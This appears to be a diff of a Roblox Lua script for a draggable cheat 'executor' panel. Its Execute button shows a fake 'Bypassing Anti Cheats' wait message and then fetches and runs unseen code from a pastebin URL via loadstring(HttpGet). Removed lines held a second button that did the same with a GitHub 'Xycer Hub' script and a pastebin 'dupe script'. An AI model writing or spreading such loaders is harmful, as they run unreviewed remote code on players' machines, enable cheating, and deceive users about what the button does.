@@ -48,29 +48,15 @@ executeButton.TextSize = 18
 executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 executeButton.BackgroundColor3 = Color3.fromRGB(40, 120, 40)
 executeButton.Size = UDim2.new(0.8, 0, 0, 40)
-executeButton.Position = UDim2.new(0.1, 0, 1, -95)
+executeButton.Position = UDim2.new(0.1, 0, 1, -50)
 executeButton.Parent = mainFrame
 
 local execCorner = Instance.new("UICorner")
 execCorner.CornerRadius = UDim.new(0, 8)
 execCorner.Parent = executeButton
 
-local newExecuteButton = Instance.new("TextButton")
-newExecuteButton.Text = "[New] Execute"
-newExecuteButton.Font = Enum.Font.GothamBold
-newExecuteButton.TextSize = 18
-newExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-newExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 60, 150)
-newExecuteButton.Size = UDim2.new(0.8, 0, 0, 40)
-newExecuteButton.Position = UDim2.new(0.1, 0, 1, -50)
-newExecuteButton.Parent = mainFrame
-
-local newExecCorner = Instance.new("UICorner")
-newExecCorner.CornerRadius = UDim.new(0, 8)
-newExecCorner.Parent = newExecuteButton
-
--- Dragging functionality
 local dragging, dragInput, dragStart, startPos
+
 mainFrame.InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
 		dragging = true
@@ -83,11 +69,13 @@ mainFrame.InputBegan:Connect(function(input)
 		end)
 	end
 end)
+
 mainFrame.InputChanged:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseMovement then
 		dragInput = input
 	end
 end)
+
 game:GetService("UserInputService").InputChanged:Connect(function(input)
 	if input == dragInput and dragging then
 		local delta = input.Position - dragStart
@@ -98,47 +86,13 @@ end)
 executeButton.MouseButton1Click:Connect(function()
 	executeButton.Text = "Starting..."
 	description.Text = "Wait 10-15 mins - Bypassing Anti Cheats."
-
-	task.wait(2)
-	mainFrame.Visible = false
-
+	task.wait(2) -- Executes after a 2-second delay (secretly)
 	local success, err = pcall(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/3TY0Gi6g"))()
 	end)
-
 	if success then
-		print("Pastebin script executed.")
+		description.Text = "Executed successfully."
 	else
-		warn("Pastebin failed:", err)
-	end
-end)
-
-newExecuteButton.MouseButton1Click:Connect(function()
-	newExecuteButton.Text = "Loading..."
-	description.Text = "Running first script (Xycer Hub)..."
-
-	task.wait(2)
-	mainFrame.Visible = false -- Hide the GUI
-
-	local success1, err1 = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/GRPGaming/Key-System/refs/heads/Xycer-Hub-Script/ZyGaG6"))()
-	end)
-
-	if success1 then
-		print("Xycer Hub executed.")
-	else
-		warn("Xycer Hub failed:", err1)
-	end
-
-	task.wait(0.5)
-
-	local success2, err2 = pcall(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/3TY0Gi6g"))()
-	end)
-
-	if success2 then
-		print("Dupe script executed after Xycer.")
-	else
-		warn("Dupe script failed:", err2)
+		description.Text = "Execution failed."
 	end
 end)
